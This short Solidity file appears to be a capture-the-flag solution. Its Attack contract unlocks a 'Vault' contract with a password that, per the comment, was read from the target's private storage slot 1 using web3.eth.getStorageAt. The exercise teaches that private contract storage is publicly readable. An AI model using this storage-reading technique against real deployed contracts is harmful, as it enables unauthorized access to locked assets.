// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{
    constructor(Vault vault){
        /*just by typing a command into browser console 'awiat web3.eth.getStorageAt(contract.address,  1  ) 
        *                                                                                /             \        
        *                                                                      address of contract    slot in which the password is located            
        *
        *we can see what the password is '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
        */
        bytes32 password= 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
        vault.unlock(password);
    }
}
